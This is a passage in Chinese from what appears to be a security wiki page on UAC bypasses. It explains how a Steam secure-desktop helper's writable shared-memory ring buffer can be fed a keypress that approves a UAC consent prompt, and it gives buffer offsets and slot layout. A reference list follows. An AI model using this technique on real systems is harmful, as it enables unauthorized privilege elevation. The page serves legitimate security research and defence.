如果中等完整性级别的用户可以写入安全桌面辅助程序的输入 IPC，就可能破坏 UAC 提示。在报告的 Steam 设计中，`IClientSecureDesktop::BStartStreaming` 会在 `winsta0\winlogon` 上以 SYSTEM 身份启动 `secure_desktop_capture.exe`。它会以用户 `GENERIC_ALL` 权限开放 `Global\SecureDesktopInput_mem-IPCWrapper`；辅助程序读取环形缓冲区条目，并在安全桌面上调用 `SendInput`。这与 UIAccess 或更改 `PromptOnSecureDesktop` 不同：输入由一个已经在安全桌面上运行的进程转发。参见[服务 IPC 引导流程](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc)，了解客户端如何访问此处理程序。 <sup>[[15]](#references)[[16]](#references)</sup>

此环有 128 个槽位，每个槽位 173 字节。写入和读取计数器位于 `0x414` 和 `0x418`，槽位 `N` 位于 `0x41c + 173*N`。将槽位的首字节设为 `0` 表示明文，在其后紧接着复制一个 40 字节的 Windows `INPUT`，然后递增写入计数器。对于正面对同意提示的中等完整性级别管理员，在启动请求提升权限的可执行文件后，发送键盘 `Y` 键的按下和抬起事件可以激活 UAC 的肯定选项；但无法应答标准用户凭据提示。**同意门槛仍然重要**：只有用户在当前 90 天授权期内批准了辅助程序的 `InputEnabled` 提示后，辅助程序才会转发输入。仅有可读写的映射并不能证明输入已送达提示；请在受控测试前后比较读取计数器。 <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS：Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – 用户帐户控制的工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC 绕过技术合集](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC 绕过兼容性扫描器和启动器](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI 采用 AI 生成 PowerShell 后门](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos：针对东南亚政府目标的 0-Day 漏洞利用](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – 绕过 Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – 使用 SilentCleanup 任务绕过 UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip 和 Narrator 的始终通知绕过方法](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – 管理员保护](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – 从 .NET 调用本地 Windows RPC 服务器](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte 使用经过签名的 Windows 内核 rootkit 增强 CoolClient](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT：一种旨在监视、窃取和恐吓的完全不可检测的 Windows 木马](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Turning the Valve PoCs](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
